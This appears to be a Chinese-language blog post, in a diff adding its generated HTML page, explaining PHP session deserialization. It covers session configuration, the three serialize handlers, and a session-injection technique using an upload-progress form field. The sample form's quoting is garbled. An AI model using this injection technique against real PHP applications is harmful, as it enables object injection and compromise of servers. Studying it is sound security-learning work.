@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/upload/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/upload/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/upload/favicon-16x16.png">
+  <link rel="mask-icon" href="/upload/kaoruko.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="session反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="session反序列化">
+<meta property="og:url" content="https://hllttz.github.io/2025/09/27/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="hllttz&#39;s blog">
+<meta property="og:description" content="session反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hllttz.github.io/images/20191026142212-f2741128-f7b8-1-1758727712665-3.png">
+<meta property="og:image" content="https://hllttz.github.io/images/20191026142328-1fba974c-f7b9-1-1758727981711-6.png">
+<meta property="og:image" content="https://hllttz.github.io/images/20191026142528-67263294-f7b9-1.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250925215849721.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250925215904047.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250925220635731.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250925220931737.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250925221204325.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250925222825873.png">
+<meta property="og:image" content="https://hllttz.github.io/images/20191026143047-2590dbc6-f7ba-1.png">
+<meta property="og:image" content="https://hllttz.github.io/images/20191026143120-38e1af5c-f7ba-1.png">
+<meta property="og:image" content="https://hllttz.github.io/images/20191026143204-5312300e-f7ba-1.png">
+<meta property="article:published_time" content="2025-09-27T12:19:29.000Z">
+<meta property="article:modified_time" content="2025-09-27T12:20:27.244Z">
+<meta property="article:author" content="hllttz">
+<meta property="article:tag" content="session 反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hllttz.github.io/images/20191026142212-f2741128-f7b8-1-1758727712665-3.png">
+
+
+<link rel="canonical" href="https://hllttz.github.io/2025/09/27/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hllttz.github.io/2025/09/27/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2025/09/27/session反序列化/","title":"session反序列化"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>session反序列化 | hllttz's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">hllttz's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">11</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession"><span class="nav-number">1.</span> <span class="nav-text">什么是session</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Session-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">PHP Session 的工作流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-session-%E5%9C%A8-php-ini-%E4%B8%AD%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">PHP session 在 php.ini 中的配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-session-%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">4.</span> <span class="nav-text">PHP session 的存储机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">4.1.</span> <span class="nav-text">php处理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">4.2.</span> <span class="nav-text">php_binary处理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">4.3.</span> <span class="nav-text">php_serialize 处理器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">5.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">例题</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">hllttz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hllttz.github.io/2025/09/27/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hllttz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hllttz's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="session反序列化 | hllttz's blog">
+      <meta itemprop="description" content="session反序列化">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          session反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-09-27 20:19:29 / 修改时间：20:20:27" itemprop="dateCreated datePublished" datetime="2025-09-27T20:19:29+08:00">2025-09-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-php/" itemprop="url" rel="index"><span itemprop="name">session 反序列化 php</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">session反序列化</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="什么是session"><a href="#什么是session" class="headerlink" title="什么是session"></a>什么是session</h1><p>在讲<code>php session反序列化</code>之前,必须知道什么是session</p>
+<p><code>Session</code>一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里仅讨论<code>PHP session</code>机制。</p>
+<p><code>PHP session</code>可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 <code>session</code> 值会存储于服务器端，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
+<h1 id="PHP-Session-的工作流程"><a href="#PHP-Session-的工作流程" class="headerlink" title="PHP Session 的工作流程"></a>PHP Session 的工作流程</h1><p>session的工作流程很简单,当开始一个会话时,php会尝试从请求中查找会话ID(通常通过会话cookie),如果发现请求的<code>cookie</code>,<code>get</code>,<code>post</code>中不存在<code>session id</code>,php就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>报文中通过<code>set-cookie</code>头部发送给客户端保存,如图:</p>
+<p><img src="/images/20191026142212-f2741128-f7b8-1-1758727712665-3.png" alt="20191026142212-f2741128-f7b8-1"></p>
+<p>有时候浏览器的用户设置中会禁止<code>cookie</code>,当浏览器客户端中的<code>cookie</code>被禁用的情况下,php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
+<p>会话开始之后，PHP 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  	<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;xianzhi&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当php停止的时候,php会使用其内置的<code>文件会话保存管理器</code>来完成对<code>session</code>的保存,也可以通过配置项<code>session.save_handler</code></p>
+<p>来修改所要采用的文件会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置。</p>
+<p>整个流程大概如上所述，也可参考下述流程图：</p>
+<p><img src="/images/20191026142328-1fba974c-f7b9-1-1758727981711-6.png" alt="20191026142328-1fba974c-f7b9-1"></p>
+<h1 id="PHP-session-在-php-ini-中的配置"><a href="#PHP-session-在-php-ini-中的配置" class="headerlink" title="PHP session 在 php.ini 中的配置"></a>PHP session 在 php.ini 中的配置</h1><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项：</p>
+<ul>
+<li><p>session.gc_divisor</p>
+<p>php session垃圾回收机制相关配置</p>
+</li>
+<li><p>session.sid_bits_per_character</p>
+<p>指定编码的会话ID字符中的位数</p>
+</li>
+<li><p>session.save_path&#x3D;””</p>
+<p>该配置主要设置<code>session</code>的存储路径</p>
+</li>
+<li><p>session.save_handler&#x3D;””</p>
+<p>该配置主要设定用户自定义存储函数，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
+</li>
+<li><p>session.use_strict_mode</p>
+<p>严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID</p>
+</li>
+<li><p>session.use_cookies</p>
+<p>指定是否在客户端用 cookie 来存放会话 ID，默认启用</p>
+</li>
+<li><p>session.cookie_secure</p>
+<p>指定是否仅通过安全连接发送 <code>cookie</code>，默认关闭</p>
+</li>
+<li><p>session.use_only_cookies</p>
+<p>指定是否在客户端<em>仅仅</em>使用<code>cookie</code>来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击</p>
+</li>
+<li><p>session.name</p>
+<p>指定会话名以用做 <code>cookie</code> 的名字，只能由字母数字组成，默认为 <code>PHPSESSID</code></p>
+</li>
+<li><p>session.auto_start</p>
+<p>指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</p>
+</li>
+<li><p>session.cookie_lifetime</p>
+<p>指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 0 表示“直到关闭浏览器”。默认为 <em>0</em></p>
+</li>
+<li><p>session.cookie_path</p>
+<p>指定要设置会话<code>cookie</code> 的路径，默认为 <em>&#x2F;</em></p>
+</li>
+<li><p>session.cookie_domain</p>
+<p>指定要设置会话<code>cookie</code> 的域名，默认为无，表示根据 <code>cookie</code> 规范产生<code>cookie</code>的主机名</p>
+</li>
+<li><p>session.cookie_httponly</p>
+<p>将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用</p>
+</li>
+<li><p>session.serialize_handler</p>
+<p>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
+</li>
+<li><p>session.gc_probability</p>
+<p>该配置项与 <code>session.gc_divisor</code> 合起来用来管理 <code>garbage collection</code>，即垃圾回收进程启动的概率</p>
+</li>
+<li><p>session.gc_divisor</p>
+<p>该配置项与<code>session.gc_probability</code>合起来定义了在每个会话初始化时启动垃圾回收进程的概率</p>
+</li>
+<li><p>session.gc_maxlifetime</p>
+<p>指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在<code>session</code>启动的时候开始（ 取决于<code>session.gc_probability</code> 和 <code>session.gc_divisor</code>）</p>
+</li>
+<li><p>session.referer_check</p>
+<p>包含有用来检查每个 <code>HTTP Referer</code>的子串。如果客户端发送了<code>Referer</code>信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串</p>
+</li>
+<li><p>session.cache_limiter</p>
+<p>指定会话页面所使用的缓冲控制方法（<code>none/nocache/private/private_no_expire/public</code>）。默认为 <code>nocache</code></p>
+</li>
+<li><p>session.cache_expire</p>
+<p>以分钟数指定缓冲的会话页面的存活期，此设定对<code>nocache</code>缓冲控制方法无效。默认为 180</p>
+</li>
+<li><p>session.use_trans_sid</p>
+<p>指定是否启用透明 SID 支持。默认禁用</p>
+</li>
+<li><p>session.sid_length</p>
+<p>配置会话ID字符串的长度。 会话ID的长度可以在22到256之间。默认值为32。</p>
+</li>
+<li><p>session.trans_sid_tags</p>
+<p>指定启用透明sid支持时重写哪些HTML标签以包括会话ID</p>
+</li>
+<li><p>session.trans_sid_hosts</p>
+<p>指定启用透明sid支持时重写的主机，以包括会话ID</p>
+</li>
+<li><p>session.sid_bits_per_character</p>
+<p>配置编码的会话ID字符中的位数</p>
+</li>
+<li><p>session.upload_progress.enabled</p>
+<p>启用上传进度跟踪，并填充<code>$ _SESSION</code>变量， 默认启用。</p>
+</li>
+<li><p>session.upload_progress.cleanup</p>
+<p>读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</p>
+</li>
+<li><p>session.upload_progress.prefix</p>
+<p>配置<code>$ _SESSION</code>中用于上传进度键的前缀，默认为<code>upload_progress_</code></p>
+</li>
+<li><p>session.upload_progress.name</p>
+<p><code>$ _SESSION</code>中用于存储进度信息的键的名称，默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code></p>
+</li>
+<li><p>session.upload_progress.freq</p>
+<p>定义应该多长时间更新一次上传进度信息</p>
+</li>
+<li><p>session.upload_progress.min_freq</p>
+<p>更新之间的最小延迟</p>
+</li>
+<li><p>session.lazy_write</p>
+<p>配置会话数据在更改时是否被重写，默认启用</p>
+</li>
+</ul>
+<h1 id="PHP-session-的存储机制"><a href="#PHP-session-的存储机制" class="headerlink" title="PHP session 的存储机制"></a>PHP session 的存储机制</h1><p>前面有提到过,在php中,不同的序列化&#x2F;反序列化的处理器,会导致不同的session储存方式。因为<code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的。默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名。</p>
+<p><img src="/images/20191026142528-67263294-f7b9-1.png" alt="20191026142528-67263294-f7b9-1"></p>
+<p>文件的内容一直都是session值经过序列化之后的内容，只是格式略有变化</p>
+<p>![20191026142445-4dd97c2e-f7b9-1 (&#x2F;images&#x2F;20191026142445-4dd97c2e-f7b9-1 (1).png)](&#x2F;images&#x2F;20191026142445-4dd97c2e-f7b9-1 (1).png)</p>
+<p><code>session.serialize_handler</code>定义的引擎有三种，如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody></table>
+<p>上述三种处理器中，<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
+<p>下面我们实例来看看三种不同处理器序列化后的结果。</p>
+<h2 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h2><p>首先来看看<code>session.serialize_handler</code>等于 <code>php</code>时候的序列化结果，php代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250925215849721.png" alt="image-20250925215849721"></p>
+<p><img src="/images/image-20250925215904047.png" alt="image-20250925215904047"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session|s:<span class="number">6</span>:<span class="string">&quot;winter&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值,<code>s</code>代表是字符串类型</p>
+<h2 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h2><p>再来看看<code>session.serialize_handler</code>等于 <code>php_binary</code>时候的序列化结果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250925220635731.png" alt="image-20250925220635731"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions:6:&quot;winter&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>但实际上,它应该长成这样:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x07]sessions:6:&quot;winter&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这样不好看出区别,改一下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250925220931737.png" alt="image-20250925220931737"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#sessionsessionsessionsessionsessions:6:&quot;winter&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果就是这样</p>
+<h2 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h2><p>来看php_serialize对session的处理结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250925221204325.png" alt="image-20250925221204325"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;winter&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>一个payload如下;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">“</span> <span class="attr">upload.php</span>” <span class="attr">method</span> =<span class="string">“</span> <span class="attr">POST</span>” <span class="attr">enctype</span> =<span class="string">“</span> <span class="attr">multipart</span> / <span class="attr">form-data</span>”&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">“</span> <span class="attr">hidden</span>” <span class="attr">name</span> =<span class="string">“</span> <span class="attr">PHP_SESSION_UPLOAD_PROGRESS</span>” <span class="attr">value</span> =<span class="string">“</span> <span class="attr">ryat</span>” /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">“</span> <span class="attr">file</span>” <span class="attr">name</span> =<span class="string">“</span> <span class="attr">file</span>” /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">“</span> <span class="attr">submit</span>” /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后<code>$_SESSION</code>中的键值就会为<code>$_SESSION[&quot;upload_progress_ryat&quot;]</code>，在会话上传过程中，将对会话数据进行序列化&#x2F;反序列化，序列化格式由<code>php.ini</code>中的<code>session.serialize_handler</code>选项设置。 这意味着，如果在脚本中设置了不同的<code>serialize_handler</code>，那么可以导致注入任意<code>session</code>数据。</p>
